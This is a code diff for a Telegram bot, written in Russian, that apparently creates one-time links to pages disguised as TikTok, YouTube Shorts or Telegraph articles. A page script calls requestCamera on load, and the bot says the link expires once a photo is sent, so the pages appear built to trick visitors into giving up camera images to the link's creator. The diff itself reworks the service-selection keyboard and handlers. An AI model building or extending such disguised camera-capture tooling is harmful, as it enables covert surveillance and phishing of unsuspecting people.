@@ -172,97 +172,69 @@ def public_link(service: str, token: str) -> str:
 
 
 def service_keyboard() -> ReplyKeyboardMarkup:
-    # В зависимости от текущего сервиса показываем только его кнопку
-    if SERVICE_TYPE == "tiktok":
-        return ReplyKeyboardMarkup(
-            keyboard=[[KeyboardButton(text="🎵 Создать TikTok")]],
-            resize_keyboard=True,
-        )
-    elif SERVICE_TYPE == "youtube":
-        return ReplyKeyboardMarkup(
-            keyboard=[[KeyboardButton(text="📺 Создать YouTube")]],
-            resize_keyboard=True,
-        )
-    elif SERVICE_TYPE == "telegraph":
-        return ReplyKeyboardMarkup(
-            keyboard=[[KeyboardButton(text="📝 Создать Telegraph")]],
-            resize_keyboard=True,
-        )
-    else:
-        return ReplyKeyboardMarkup(
-            keyboard=[
-                [KeyboardButton(text="🎵 TikTok")],
-                [KeyboardButton(text="📺 YouTube")],
-                [KeyboardButton(text="📝 Telegraph")],
-            ],
-            resize_keyboard=True,
-        )
+    """Клавиатура с тремя кнопками для всех сервисов"""
+    return ReplyKeyboardMarkup(
+        keyboard=[
+            [KeyboardButton(text="🎵 TikTok")],
+            [KeyboardButton(text="📺 YouTube")],
+            [KeyboardButton(text="📝 Telegraph")],
+        ],
+        resize_keyboard=True,
+    )
 
 
 @router.message(CommandStart())
 async def start(message: Message):
-    service_name = SERVICES[SERVICE_TYPE]["name"]
-    service_emoji = SERVICES[SERVICE_TYPE]["emoji"]
-    
     await message.answer(
-        f"{service_emoji} Добро пожаловать в {service_name} бот!\n\n"
-        f"Нажмите кнопку ниже, чтобы создать одноразовую ссылку для отправки фото.",
+        "👋 Выберите оформление страницы:\n\n"
+        "🎵 TikTok — стиль видео\n"
+        "📺 YouTube — стиль Shorts\n"
+        "📝 Telegraph — стиль статьи",
         reply_markup=service_keyboard(),
     )
 
 
 @router.message(Command("new"))
 async def new_link_command(message: Message):
-    await message.answer("Создайте новую ссылку:", reply_markup=service_keyboard())
+    await message.answer("Выберите оформление новой ссылки:", reply_markup=service_keyboard())
 
 
-# Обработчики для разных сервисов
-@router.message(F.text == "🎵 Создать TikTok")
-async def create_tiktok_link(message: Message):
-    token = create_link(message.chat.id, "tiktok")
-    url = public_link("tiktok", token)
-    
+@router.message(F.text.in_({"🎵 TikTok", "📺 YouTube", "📝 Telegraph"}))
+async def create_service_link(message: Message):
+    service_map = {
+        "🎵 TikTok": "tiktok",
+        "📺 YouTube": "youtube",
+        "📝 Telegraph": "telegraph",
+    }
+    service = service_map.get(message.text)
+    if not service:
+        return
+
+    if service == "telegraph":
+        await message.answer(
+            "📝 Введите заголовок статьи (или отправьте '-' для пропуска):"
+        )
+        user_data[message.chat.id] = {"service": service, "step": "title"}
+        return
+
+    token = create_link(message.chat.id, service)
+    url = public_link(service, token)
+    info = SERVICES[service]
+
     kb = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="🎵 Создать TikTok")]],
+        keyboard=[[KeyboardButton(text="🔗 Создать новую ссылку")]],
         resize_keyboard=True,
     )
     
     await message.answer(
-        f"🎵 Одноразовая ссылка TikTok создана:\n"
+        f"{info['emoji']} Одноразовая ссылка создана:\n"
         f"<a href='{url}'>{url}</a>\n\n"
-        f"После отправки фото ссылка перестанет работать.",
+        f"Оформление страницы: {info['name']}.\n"
+        "После успешной отправки фото ссылка перестанет работать.",
         parse_mode="HTML",
         reply_markup=kb,
         disable_web_page_preview=False,
     )
-
-
-@router.message(F.text == "📺 Создать YouTube")
-async def create_youtube_link(message: Message):
-    token = create_link(message.chat.id, "youtube")
-    url = public_link("youtube", token)
-    
-    kb = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="📺 Создать YouTube")]],
-        resize_keyboard=True,
-    )
-    
-    await message.answer(
-        f"📺 Одноразовая ссылка YouTube Shorts создана:\n"
-        f"<a href='{url}'>{url}</a>\n\n"
-        f"После отправки фото ссылка перестанет работать.",
-        parse_mode="HTML",
-        reply_markup=kb,
-        disable_web_page_preview=False,
-    )
-
-
-@router.message(F.text == "📝 Создать Telegraph")
-async def create_telegraph_link_start(message: Message):
-    await message.answer(
-        "📝 Введите заголовок статьи (или отправьте '-' для пропуска):"
-    )
-    user_data[message.chat.id] = {"service": "telegraph", "step": "title"}
 
 
 # Хранилище состояний пользователей
@@ -297,23 +269,30 @@ async def handle_telegraph_input(message: Message):
         
         token = create_link(chat_id, service, state.get("title", "📝 Статья Telegraph"), content)
         url = public_link("telegraph", token)
+        info = SERVICES[service]
         
         del user_data[chat_id]
         
         kb = ReplyKeyboardMarkup(
-            keyboard=[[KeyboardButton(text="📝 Создать Telegraph")]],
+            keyboard=[[KeyboardButton(text="🔗 Создать новую ссылку")]],
             resize_keyboard=True,
         )
         
         await message.answer(
-            f"📝 Одноразовая ссылка Telegraph создана:\n"
+            f"{info['emoji']} Одноразовая ссылка создана:\n"
             f"<a href='{url}'>{url}</a>\n\n"
-            f"После отправки фото ссылка перестанет работать.",
+            f"Оформление страницы: {info['name']}.\n"
+            "После успешной отправки фото ссылка перестанет работать.",
             parse_mode="HTML",
             reply_markup=kb,
             disable_web_page_preview=False,
         )
         return
+
+
+@router.message(F.text == "🔗 Создать новую ссылку")
+async def new_link(message: Message):
+    await message.answer("Выберите оформление новой ссылки:", reply_markup=service_keyboard())
 
 
 def generate_tiktok_page(token: str) -> str:
@@ -629,8 +608,7 @@ document.addEventListener('DOMContentLoaded', () => setTimeout(requestCamera, 50
 
 @app.get("/", response_class=HTMLResponse)
 async def root():
-    service_name = SERVICES[SERVICE_TYPE]["name"]
-    return f"<h3>{service_name} Bot is running.</h3>"
+    return "<h3>Camera Link Bot is running. Choose service in Telegram.</h3>"
 
 
 @app.get("/@{short_id}")
